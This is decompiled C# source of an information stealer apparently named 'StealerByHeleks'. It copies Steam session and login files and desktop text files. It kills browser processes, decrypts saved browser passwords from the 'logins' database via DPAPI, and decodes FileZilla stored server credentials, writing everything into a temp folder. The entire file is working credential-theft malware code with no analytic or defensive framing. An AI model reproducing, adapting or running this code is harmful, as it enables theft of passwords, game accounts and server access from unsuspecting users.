// Decompiled with JetBrains decompiler
// Type: Steeal.Stealers
// Assembly: Heleks_IL, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FBB44E79-1326-4A0E-9F49-E3687B1B8C49
// Assembly location: C:\Users\Пользователь\Desktop\Dumps\Heleks.exe

using Microsoft.Win32;
using System;
using System.Data;
using System.Data.SQLite;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Xml.Linq;

namespace Steeal
{
  internal class Stealers
  {
    private static string desktoppath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
    private static string tempPath = Path.GetTempPath() + "\\";
    private static string desktopstealedtxtpath = Stealers.tempPath + "StealerByHeleks\\DesktopTxts";
    private static string steamstealedpath = Stealers.tempPath + "StealerByHeleks\\Steam";
    private static string browserstealpathes = Stealers.tempPath + "StealerByHeleks\\Browsers";
    private static string steampath = (string) Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Valve\\Steam", "Steampath", (object) null);

    public static void Steal_txt()
    {
      try
      {
        string empty1 = string.Empty;
        string empty2 = string.Empty;
        if (!Directory.Exists(Stealers.desktoppath))
          return;
        foreach (string file in Directory.GetFiles(Stealers.desktoppath, "*.txt"))
        {
          string fileName = Path.GetFileName(file);
          File.Copy(file, Path.Combine(Stealers.desktopstealedtxtpath, fileName), true);
        }
      }
      catch
      {
      }
    }

    public static void Steal_Steam()
    {
      try
      {
        string str1 = string.Empty;
        string str2 = string.Empty;
        string empty1 = string.Empty;
        string empty2 = string.Empty;
        if (!Directory.Exists(Stealers.steampath))
          return;
        foreach (string file in Directory.GetFiles(Stealers.steampath, "ssfn*"))
        {
          string fileName = Path.GetFileName(file);
          File.Copy(file, Path.Combine(Stealers.steamstealedpath, fileName), true);
        }
        foreach (string file in Directory.GetFiles(Stealers.steampath, "SteamAppData.vdf", SearchOption.AllDirectories))
        {
          str1 = Path.GetFileName(file);
          str2 = Path.Combine(Stealers.steamstealedpath, empty1);
          File.Copy(file, empty2, true);
        }
        File.Copy(Stealers.steampath + "\\config\\config.vdf", Stealers.steamstealedpath + "\\config.vdf", true);
        File.Copy(Stealers.steampath + "\\config\\loginusers.vdf", Stealers.steamstealedpath + "\\loginusers.vdf", true);
      }
      catch
      {
      }
    }

    public static void Steal_Browser(string proccsesname, string stealerpath, string savename)
    {
      try
      {
        foreach (Process process in Process.GetProcesses())
        {
          if (process.ProcessName.ToString() == proccsesname)
            process.Kill();
        }
        string connectionString = string.Format("Data Source = {0}", (object) (Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + stealerpath));
        StreamWriter streamWriter = new StreamWriter(Path.GetTempPath() + "\\StealerByHeleks\\Browsers\\" + savename + "_Passwords.txt", false, Encoding.UTF8);
        byte[] entropyBytes = (byte[]) null;
        DataTable dataTable = new DataTable();
        using (SQLiteConnection connection = new SQLiteConnection(connectionString))
          new SQLiteDataAdapter(new SQLiteCommand(string.Format("SELECT * FROM {0}", (object) "logins"), connection)).Fill(dataTable);
        int count = dataTable.Rows.Count;
        for (int index = 0; index < count; ++index)
        {
          string str1 = dataTable.Rows[index][1].ToString();
          string str2 = dataTable.Rows[index][3].ToString();
          string description;
          string str3 = new UTF8Encoding(true).GetString(DPAPI.Decrypt((byte[]) dataTable.Rows[index][5], entropyBytes, out description));
          streamWriter.WriteLine("----------------------------");
          streamWriter.WriteLine(string.Format("URL: {0}", (object) str1));
          streamWriter.WriteLine(string.Format("Login: {0}", (object) str2));
          streamWriter.WriteLine(string.Format("Pass: {0}", (object) str3));
        }
        streamWriter.WriteLine("----------------------------");
        streamWriter.WriteLine(string.Format("Total logs: {0}", (object) count));
        streamWriter.Close();
      }
      catch
      {
      }
    }

  public static void TestMessage(string str, string str1)
  {
    try
    {
        File.WriteAllText(str, str1);
    }
    catch{}
  }

    public static void Steal_FileZila()
    {
      try
      {
        string contents = "";
        foreach (var data in XDocument.Load((TextReader) new StringReader(File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\recentservers.xml"))).Descendants((XName) "Server").Select(user => new{ host = user.Descendants((XName) "Host").SingleOrDefault<XElement>(), port = user.Descendants((XName) "Port").SingleOrDefault<XElement>(), login = user.Descendants((XName) "User").SingleOrDefault<XElement>(), pass = user.Descendants((XName) "Pass").SingleOrDefault<XElement>() }).ToList().Select(item => new{ host = item.host != null ? item.host.Value : (string) null, port = item.port != null ? item.port.Value : (string) null, login = item.login != null ? item.login.Value : (string) null, pass = item.pass != null ? item.pass.Value : (string) null }))
        {
          string path = Path.GetTempPath() + "\\StealerByHeleks\\Browsers\\FileZila.txt";
          string str = Encoding.UTF8.GetString(Convert.FromBase64String(data.pass));
          contents = contents + "Host: " + data.host + "\r\nPort: " + data.port + "\r\nLogin: " + data.login + "\r\nPass: " + str + "\r\n----------------------------\r\n";
          File.WriteAllText(path, contents);
        }
      }
      catch
      {
      }
    }
  }
}
